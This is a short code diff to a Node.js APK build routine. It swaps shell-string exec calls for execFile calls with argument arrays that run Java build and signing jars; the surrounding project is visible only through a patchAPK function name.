@@ -86,17 +86,22 @@ function patchAPK(URI, PORT, cb) {
 
 function buildAPK(cb) {
     javaversion(function (err, version) {
-        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
-            if (error) {
-                isBuilding = false;
-                return cb('Build Command Failed - ' + error.message);
-            } else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
-                isBuilding = false;
-                if (!error) return cb(false);
-                else return cb('Sign Command Failed - ' + error.message);
+        if (!err) {
+            const buildArgs = ['-jar', CONST.apkTool, 'b', CONST.smaliPath, '-o', CONST.apkBuildPath];
+            cp.execFile('java', buildArgs, (error, stdout, stderr) => {
+                if (error) {
+                    isBuilding = false;
+                    return cb('Build Command Failed - ' + error.message);
+                } else {
+                    const signArgs = ['-jar', CONST.apkSign, CONST.apkBuildPath, '-o', CONST.apkSignedBuildPath];
+                    cp.execFile('java', signArgs, (error, stdout, stderr) => {
+                        isBuilding = false;
+                        if (!error) return cb(false);
+                        else return cb('Sign Command Failed - ' + error.message);
+                    });
+                }
             });
-        });
-        else {
+        } else {
             isBuilding = false;
             return cb(err);
         }
